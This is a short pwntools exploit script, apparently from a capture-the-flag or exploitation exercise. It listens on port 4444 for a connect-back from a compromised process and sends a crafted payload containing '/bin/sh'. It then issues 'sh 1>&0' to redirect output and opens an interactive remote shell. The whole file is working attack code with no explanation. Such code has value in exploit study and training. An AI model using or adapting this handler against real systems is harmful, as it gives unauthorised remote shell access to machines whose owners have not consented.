from pwn import *

l = listen(4444)
l.wait_for_connection()
#data = l.recvall()

l.send(p64(0x0)+p64(0)+"/bin/sh\x00")
l.sendline("sh 1>&0")

l.interactive()

#for i in range(0,len(data),8):
#	print hex(u64(data[i:i+8]))
